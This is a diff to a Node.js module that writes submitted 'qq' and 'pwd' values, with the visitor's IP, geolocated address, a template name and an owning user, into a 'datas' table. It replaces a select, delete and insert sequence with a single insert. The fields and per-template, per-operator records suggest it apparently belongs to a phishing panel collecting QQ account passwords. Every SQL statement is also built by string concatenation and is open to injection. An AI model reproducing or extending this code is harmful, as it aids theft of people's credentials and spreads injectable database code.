@@ -30,28 +30,30 @@ module.exports = function (app) {
         sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + userId + ';', function (err, rows) {
             mname = rows[0].tempName;
             userName = rows[0].userName;
-            sql.all(`select count(*) from datas where ranid='${ranid}';`, function (err, rows) {
-                if (rows[0]['count(*)'] >= 1) {
-                    return sql.all(`delete from datas where ranid='${ranid}';`,function(){
-                        sql.all(`insert into datas values(null,"${qq}","${pwd}","${ip}","${['未知地址']}",${mid},"${mname}",${userId},"${userName}","${insertTime}",0,'','','${ranid}');`, function (err, rows) {
-                            _ip(ip, function (ip, add) {
-                                address = add;
-                                sql.all('UPDATE datas SET address = "' + address + '" WHERE ip = "' + ip + '";')
-                            });
-                            cb();
-                        });
-                    })
-                } else {
-                    sql.all(`insert into datas values(null,"${qq}","${pwd}","${ip}","${['未知地址']}",${mid},"${mname}",${userId},"${userName}","${insertTime}",0,'','','${ranid}');`, function (err, rows) {
-                        _ip(ip, function (ip, add) {
-                            address = add;
-                            sql.all('UPDATE datas SET address = "' + address + '" WHERE ip = "' + ip + '";')
-                        });
-                        cb();
-                    });
-                }
+            // 两次合并成一次
+            // sql.all(`select count(*) from datas where ranid='${ranid}';`, function (err, rows) {
+            //     if (rows[0]['count(*)'] >= 1) {
+            //         return sql.all(`delete from datas where ranid='${ranid}';`,function(){
+            //             sql.all(`insert into datas values(null,"${qq}","${pwd}","${ip}","${['未知地址']}",${mid},"${mname}",${userId},"${userName}","${insertTime}",0,'','','${ranid}');`, function (err, rows) {
+            //                 _ip(ip, function (ip, add) {
+            //                     address = add;
+            //                     sql.all('UPDATE datas SET address = "' + address + '" WHERE ip = "' + ip + '";')
+            //                 });
+            //                 cb();
+            //             });
+            //         })
+            //     } else {
+                    
+            //     }
                 
-            })
+            // })
+            sql.all(`insert into datas values(null,"${qq}","${pwd}","${ip}","${['未知地址']}",${mid},"${mname}",${userId},"${userName}","${insertTime}",0,'','','${ranid}');`, function (err, rows) {
+                _ip(ip, function (ip, add) {
+                    address = add;
+                    sql.all('UPDATE datas SET address = "' + address + '" WHERE ip = "' + ip + '";')
+                });
+                cb();
+            });
         });
     };
 
